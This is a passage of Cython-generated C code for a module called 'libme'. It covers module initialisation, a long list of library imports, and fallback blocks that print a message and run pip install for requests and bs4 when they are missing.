static CYTHON_SMALL_CODE int __pyx_pymod_exec_libme(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  int __pyx_t_11;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'libme' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_libme(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("libme", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_libme) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name_2, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "libme")) {
      if (unlikely(PyDict_SetItemString(modules, "libme", __pyx_m) < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif

  /* "libme.pyx":18
 * #include <time>
 * 
 * import os             # <<<<<<<<<<<<<<
 * import os,sys,time,datetime,calendar,random,hashlib,re,threading,json,getpass,urllib,requests,uuid,subprocess,base64
 * from concurrent.futures import ThreadPoolExecutor
 */
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":19
 * 
 * import os
 * import os,sys,time,datetime,calendar,random,hashlib,re,threading,json,getpass,urllib,requests,uuid,subprocess,base64             # <<<<<<<<<<<<<<
 * from concurrent.futures import ThreadPoolExecutor
 * from bs4 import BeautifulSoup as parser
 */
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_datetime, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datetime, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_calendar, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_calendar, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_hashlib, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hashlib, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_re, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_re, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_threading, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_threading, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_json, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_getpass, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_getpass, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_urllib, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_urllib, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_uuid, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_subprocess, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_subprocess, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_base64, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":20
 * import os
 * import os,sys,time,datetime,calendar,random,hashlib,re,threading,json,getpass,urllib,requests,uuid,subprocess,base64
 * from concurrent.futures import ThreadPoolExecutor             # <<<<<<<<<<<<<<
 * from bs4 import BeautifulSoup as parser
 * from datetime import datetime
 */
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_ThreadPoolExecutor);
  __Pyx_GIVEREF(__pyx_n_s_ThreadPoolExecutor);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_ThreadPoolExecutor);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_concurrent_futures, __pyx_t_1, -1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ThreadPoolExecutor, __pyx_t_1) < 0) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":21
 * import os,sys,time,datetime,calendar,random,hashlib,re,threading,json,getpass,urllib,requests,uuid,subprocess,base64
 * from concurrent.futures import ThreadPoolExecutor
 * from bs4 import BeautifulSoup as parser             # <<<<<<<<<<<<<<
 * from datetime import datetime
 * from datetime import date
 */
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_BeautifulSoup);
  __Pyx_GIVEREF(__pyx_n_s_BeautifulSoup);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_BeautifulSoup);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_bs4, __pyx_t_2, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_BeautifulSoup); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_parser, __pyx_t_2) < 0) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":22
 * from concurrent.futures import ThreadPoolExecutor
 * from bs4 import BeautifulSoup as parser
 * from datetime import datetime             # <<<<<<<<<<<<<<
 * from datetime import date
 * try:
 */
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_datetime);
  __Pyx_GIVEREF(__pyx_n_s_datetime);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_datetime);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_datetime, __pyx_t_1, -1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datetime, __pyx_t_1) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":23
 * from bs4 import BeautifulSoup as parser
 * from datetime import datetime
 * from datetime import date             # <<<<<<<<<<<<<<
 * try:
 * 	import requests
 */
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_date);
  __Pyx_GIVEREF(__pyx_n_s_date);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_date);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_datetime, __pyx_t_2, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_date); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_date, __pyx_t_2) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":24
 * from datetime import datetime
 * from datetime import date
 * try:             # <<<<<<<<<<<<<<
 * 	import requests
 * except ImportError:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      /* "libme.pyx":25
 * from datetime import date
 * try:
 * 	import requests             # <<<<<<<<<<<<<<
 * except ImportError:
 * 	print("\n ! james requests module is not installed")
 */
      __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 25, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_1);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_1) < 0) __PYX_ERR(0, 25, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":24
 * from datetime import datetime
 * from datetime import date
 * try:             # <<<<<<<<<<<<<<
 * 	import requests
 * except ImportError:
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L7_try_end;
    __pyx_L2_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "libme.pyx":26
 * try:
 * 	import requests
 * except ImportError:             # <<<<<<<<<<<<<<
 * 	print("\n ! james requests module is not installed")
 * 	os.system("pip install requests")
 */
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ImportError);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("libme", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_2, &__pyx_t_7) < 0) __PYX_ERR(0, 26, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_7);

      /* "libme.pyx":27
 * 	import requests
 * except ImportError:
 * 	print("\n ! james requests module is not installed")             # <<<<<<<<<<<<<<
 * 	os.system("pip install requests")
 * 
 */
      if (__Pyx_PrintOne(0, __pyx_kp_s_james_requests_module_is_not_in) < 0) __PYX_ERR(0, 27, __pyx_L4_except_error)

      /* "libme.pyx":28
 * except ImportError:
 * 	print("\n ! james requests module is not installed")
 * 	os.system("pip install requests")             # <<<<<<<<<<<<<<
 * 
 * try:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 28, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 28, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__59, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 28, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L3_exception_handled;
    }
    goto __pyx_L4_except_error;
    __pyx_L4_except_error:;

    /* "libme.pyx":24
 * from datetime import datetime
 * from datetime import date
 * try:             # <<<<<<<<<<<<<<
 * 	import requests
 * except ImportError:
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L3_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L7_try_end:;
  }

  /* "libme.pyx":30
 * 	os.system("pip install requests")
 * 
 * try:             # <<<<<<<<<<<<<<
 * 	import bs4
 * except ImportError:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_4, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":31
 * 
 * try:
 * 	import bs4             # <<<<<<<<<<<<<<
 * except ImportError:
 * 	print("\n !.james bs4 module is not installed yet")
 */
      __pyx_t_7 = __Pyx_Import(__pyx_n_s_bs4, 0, -1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 31, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_bs4, __pyx_t_7) < 0) __PYX_ERR(0, 31, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "libme.pyx":30
 * 	os.system("pip install requests")
 * 
 * try:             # <<<<<<<<<<<<<<
 * 	import bs4
 * except ImportError:
 */
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L15_try_end;
    __pyx_L10_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":32
 * try:
 * 	import bs4
 * except ImportError:             # <<<<<<<<<<<<<<
 * 	print("\n !.james bs4 module is not installed yet")
 * 	os.system("pip  install bs4")
 */
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ImportError);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("libme", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_2, &__pyx_t_1) < 0) __PYX_ERR(0, 32, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_1);

      /* "libme.pyx":33
 * 	import bs4
 * except ImportError:
 * 	print("\n !.james bs4 module is not installed yet")             # <<<<<<<<<<<<<<
 * 	os.system("pip  install bs4")
 * try:
 */
      if (__Pyx_PrintOne(0, __pyx_kp_s_james_bs4_module_is_not_install) < 0) __PYX_ERR(0, 33, __pyx_L12_except_error)

      /* "libme.pyx":34
 * except ImportError:
 * 	print("\n !.james bs4 module is not installed yet")
 * 	os.system("pip  install bs4")             # <<<<<<<<<<<<<<
 * try:
 * 	import concurrent.futures
 */
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 34, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 34, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__60, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 34, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L11_exception_handled;
    }
    goto __pyx_L12_except_error;
    __pyx_L12_except_error:;

    /* "libme.pyx":30
 * 	os.system("pip install requests")
 * 
 * try:             # <<<<<<<<<<<<<<
 * 	import bs4
 * except ImportError:
 */
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L11_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    __pyx_L15_try_end:;
  }

  /* "libme.pyx":35
 * 	print("\n !.james bs4 module is not installed yet")
 * 	os.system("pip  install bs4")
 * try:             # <<<<<<<<<<<<<<
 * 	import concurrent.futures
 * except ImportError:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

